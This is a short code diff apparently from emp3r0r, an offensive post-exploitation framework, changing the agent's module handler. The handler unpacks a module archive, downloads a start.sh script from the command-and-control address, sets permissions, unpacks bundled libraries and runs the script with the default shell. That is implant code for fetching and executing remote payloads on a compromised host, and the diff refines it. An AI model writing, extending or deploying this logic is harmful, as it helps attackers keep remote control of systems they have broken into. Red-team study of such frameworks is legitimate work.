@@ -39,7 +39,7 @@ func moduleHandler(modName, checksum string) (out string) {
 	// extract files
 	os.RemoveAll(modDir)
 	if err := archiver.Unarchive(tarball, emp3r0r_data.AgentRoot); err != nil {
-		return err.Error()
+		return fmt.Sprintf("Unarchive module tarball: %v", err)
 	}
 
 	// download start.sh
@@ -47,7 +47,7 @@ func moduleHandler(modName, checksum string) (out string) {
 	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".sh",
 		start_sh)
 	if err != nil {
-		return err.Error()
+		return fmt.Sprintf("Downloading start.sh: %v", err)
 	}
 
 	// exec
@@ -61,13 +61,20 @@ func moduleHandler(modName, checksum string) (out string) {
 	}
 	defer os.Chdir(pwd)
 
-	// chmod 755 *
+	// process files in module archive
 	files, err := ioutil.ReadDir("./")
 	if err != nil {
-		return err.Error()
+		return fmt.Sprintf("Processing module files: %v", err)
 	}
 	for _, f := range files {
-		os.Chmod(f.Name(), 0755)
+		os.Chmod(f.Name(), 0700)
+		if util.IsFileExist("libs.tar.xz") {
+			os.RemoveAll("libs")
+			err = archiver.Unarchive("libs.tar.xz", "./")
+			if err != nil {
+				return fmt.Sprintf("Unarchive libs.tar.xz: %v", err)
+			}
+		}
 	}
 
 	cmd := exec.Command(emp3r0r_data.DefaultShell, start_sh)
